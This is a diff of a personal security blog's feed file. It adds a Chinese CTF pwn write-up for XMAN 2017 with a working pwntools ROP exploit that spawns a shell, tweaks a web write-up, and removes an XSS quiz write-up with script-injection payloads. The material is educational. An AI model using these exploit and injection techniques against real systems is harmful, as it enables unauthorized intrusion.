@@ -106,11 +106,50 @@
   </entry>
   
   <entry>
+    <title>XMAN选拔赛-2017-pwn-writeup</title>
+    <link href="http://yoursite.com/2017/07/16/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-pwn-writeup/"/>
+    <id>http://yoursite.com/2017/07/16/XMAN选拔赛-2017-pwn-writeup/</id>
+    <published>2017-07-16T11:58:11.000Z</published>
+    <updated>2017-07-16T16:17:53.257Z</updated>
+    
+    <content type="html"><![CDATA[<p>XMAN选拔赛-2017-pwn-writeup。<br><a id="more"></a></p>
+<h1 id="Raaa"><a href="#Raaa" class="headerlink" title="Raaa"></a>Raaa</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Are you ok? Do you like mifan?</div><div class="line">nc challenges.xctf.org.cn 14005</div></pre></td></tr></table></figure>
+<p>太简单。rand()。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</div><div class="line">	<span class="keyword">int</span> a = rand() ^ <span class="number">590558003</span>;</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"%d\n"</span>, a);</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>得到1220048468，输入。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">(venv) chybeta@ubuntu:~/pwn/ctf/XMAN2017/pwn/Raaa$ nc challenges.xctf.org.cn 14005</div><div class="line">1220048468</div><div class="line">XMAN&#123;Have_y0u_ever_heard_of_AnLi,my_fr1end?&#125;</div><div class="line">heiheiehi!</div></pre></td></tr></table></figure></p>
+<h1 id="Baaa"><a href="#Baaa" class="headerlink" title="Baaa"></a>Baaa</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">If you give me three days light。</div><div class="line">nc challenges.xctf.org.cn 14002</div></pre></td></tr></table></figure>
+<p>没给程序：）。好吧google大法好。发现是16年CSAW-warmup原题。<a href="https://www.megabeets.net/csaw-2016-pwn-warmup-writeup/" target="_blank" rel="external">https://www.megabeets.net/csaw-2016-pwn-warmup-writeup/</a></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170716/2.png?raw=true" alt=""><br>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">XMAN&#123;Ba1a1a_Xiao_Mo_Xian,BianBIanBian&#125;</div></pre></td></tr></table></figure></p>
+<h1 id="Caaa"><a href="#Caaa" class="headerlink" title="Caaa"></a>Caaa</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">一心想学bin的张日天报名了xman，开学的时候老师让大家自我介绍：</div><div class="line">老师（手上拿着名单册子）：好，下一位，请*言简意赅*的介绍自己</div><div class="line"></div><div class="line">nc challenges.xctf.org.cn 14000</div></pre></td></tr></table></figure>
+<p><img src="" alt=""></p>
+<p>很明显的栈溢出，64位rop。溢出点用pattern生成后，在gdb中<code>x/gx $rsp</code>查看再带回pattern即可求出偏移为40。要是直接看IDA的话，buf的位置在<code>bp-20h</code>，0x20+8=40，也确实是40个字节。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">p = process(<span class="string">"./2ddf143c-dd2f-4ce0-9409-9e8f72f5364a.bin"</span>)</div><div class="line"><span class="comment"># p = remote("challenges.xctf.org.cn","14000")</span></div><div class="line">elf = ELF(<span class="string">"./2ddf143c-dd2f-4ce0-9409-9e8f72f5364a.bin"</span>)</div><div class="line">system_addr = elf.symbols[<span class="string">'system'</span>]</div><div class="line">pop_rdi_ret = <span class="number">0x0000000000400973</span></div><div class="line">sh_addr = next(elf.search(<span class="string">'/bin/sh\x00'</span>))</div><div class="line">offset = <span class="number">40</span></div><div class="line"></div><div class="line">p.recv()</div><div class="line">p.sendline(<span class="string">"1"</span>)</div><div class="line">p.recv()</div><div class="line"></div><div class="line">payload = <span class="string">'a'</span> * offset</div><div class="line">payload += p64(pop_rdi_ret)</div><div class="line">payload += p64(sh_addr)</div><div class="line">payload += p64(system_addr)</div><div class="line"></div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">(venv) chybeta@ubuntu:~/pwn/ctf/XMAN2017/pwn/Caaa$ python exp.py</div><div class="line">[+] Opening connection to challenges.xctf.org.cn on port 14000: Done</div><div class="line">[*] &apos;/home/chybeta/pwn/ctf/XMAN2017/pwn/Caaa/2ddf143c-dd2f-4ce0-9409-9e8f72f5364a.bin&apos;</div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX disabled</div><div class="line">    PIE:      No PIE</div><div class="line">[*] Switching to interactive mode</div><div class="line">1</div><div class="line">your name is:</div><div class="line">hello, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaas    @!</div><div class="line">$ cat /home/xman/flag</div><div class="line">xman&#123;Welcome_to_bin_world!&#125;$</div></pre></td></tr></table></figure>
+<p>剩下的pwn题，好像都是跟堆有关的。还不会，暂时就不写了。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;XMAN选拔赛-2017-pwn-writeup。&lt;br&gt;
+    
+    </summary>
+    
+      <category term="二进制安全" scheme="http://yoursite.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
+    
+      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
+    
+      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
+    
+  </entry>
+  
+  <entry>
     <title>XMAN选拔赛-2017-web-writeup</title>
     <link href="http://yoursite.com/2017/07/16/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-web-writeup/"/>
     <id>http://yoursite.com/2017/07/16/XMAN选拔赛-2017-web-writeup/</id>
     <published>2017-07-16T03:03:50.000Z</published>
-    <updated>2017-07-16T07:04:08.257Z</updated>
+    <updated>2017-07-16T12:42:20.624Z</updated>
     
     <content type="html"><![CDATA[<p>XMAN选拔赛-2017-web-writeup 都是基础题目<br><a id="more"></a></p>
 <h1 id="variacover"><a href="#variacover" class="headerlink" title="variacover"></a>variacover</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_GET[<span class="string">'b'</span>])) &#123;</div><div class="line">   show_source(<span class="keyword">__FILE__</span>);</div><div class="line">   <span class="keyword">die</span>();</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">   <span class="keyword">include</span>(<span class="string">'flag.php'</span>);</div><div class="line">$a = <span class="string">"www.XMAN.com"</span>;</div><div class="line">$b = $_GET[<span class="string">'b'</span>];</div><div class="line">@parse_str($b);</div><div class="line"><span class="keyword">if</span> ($a[<span class="number">0</span>] != <span class="string">'QNKCDZO'</span> &amp;&amp; md5($a[<span class="number">0</span>]) == md5(<span class="string">'QNKCDZO'</span>)) &#123;</div><div class="line">   <span class="keyword">echo</span> $flag;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line"><span class="keyword">exit</span>(<span class="string">'你的答案不对0.0'</span>);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
@@ -121,7 +160,7 @@
 <p>改为XMAN后提示urldecode：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170716/2.jpg?raw=true" alt=""></p>
 <p>考点应该是类似二次注入类型，<br>将XMAN进行一次urlencode，再把其中的%替换为%25，最后的payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://challenges.xctf.org.cn:7772/?me=%2558%254d%2541%254e</div></pre></td></tr></table></figure></p>
 <p>得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">XMAN&#123;UrlDeCode_CooL_yOu_u0D3rSta9D!</div></pre></td></tr></table></figure></p>
-<p>#<br>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://challenges.xctf.org.cn:7774/?code=1</div></pre></td></tr></table></figure></p>
+<h1 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a>unserialize</h1><p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://challenges.xctf.org.cn:7774/?code=1</div></pre></td></tr></table></figure></p>
 <p>得到hint: flag.php。访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://challenges.xctf.org.cn:7774/flag.php</div></pre></td></tr></table></figure></p>
 <p>得到hint2: help.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://challenges.xctf.org.cn:7774/help.php</div></pre></td></tr></table></figure></p>
 <p>得到hint3：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">class FileClass&#123; public $filename = &apos;error.log&apos;; public function __toString()&#123; return file_get_contents($this-&gt;filename); &#125; &#125;</div></pre></td></tr></table></figure></p>
@@ -1190,43 +1229,6 @@
       <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
     
       <category term="栈溢出" scheme="http://yoursite.com/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>xss-quiz-writeup</title>
-    <link href="http://yoursite.com/2017/06/25/xss-quiz-writeup/"/>
-    <id>http://yoursite.com/2017/06/25/xss-quiz-writeup/</id>
-    <published>2017-06-25T11:25:11.000Z</published>
-    <updated>2017-07-06T09:24:11.917Z</updated>
-    
-    <content type="html"><![CDATA[<p>xss-quiz： <a href="http://xss-quiz.int21h.jp/" target="_blank" rel="external">http://xss-quiz.int21h.jp/</a><br><a id="more"></a></p>
-<h1 id="Stage-1"><a href="#Stage-1" class="headerlink" title="Stage 1"></a>Stage 1</h1><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(document.domain)&lt;/script&gt;</div></pre></td></tr></table></figure></p>
-<h1 id="Stage-2"><a href="#Stage-2" class="headerlink" title="Stage 2"></a>Stage 2</h1><p><a href="http://xss-quiz.int21h.jp/stage2.php" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage2.php</a></p>
-<p>尝试如下payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(document.domain)&lt;/script&gt;</div></pre></td></tr></table></figure></p>
-<p>无反应，查看源代码：</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170625/1.jpg?raw=true" alt=""></p>
-<p>需要闭合前面value的双引号，所以最后payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&quot;</div></pre></td></tr></table></figure></p>
-<h1 id="Stage-3"><a href="#Stage-3" class="headerlink" title="Stage 3"></a>Stage 3</h1><p><a href="http://xss-quiz.int21h.jp/stage-3.php" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage-3.php</a></p>
-<p>多了一个选择country的功能。</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;xss-quiz： &lt;a href=&quot;http://xss-quiz.int21h.jp/&quot;&gt;http://xss-quiz.int21h.jp/&lt;/a&gt;&lt;br&gt;
-    
-    </summary>
-    
-      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
-    
-      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
-    
-      <category term="web" scheme="http://yoursite.com/tags/web/"/>
-    
-      <category term="xss" scheme="http://yoursite.com/tags/xss/"/>
     
   </entry>
   
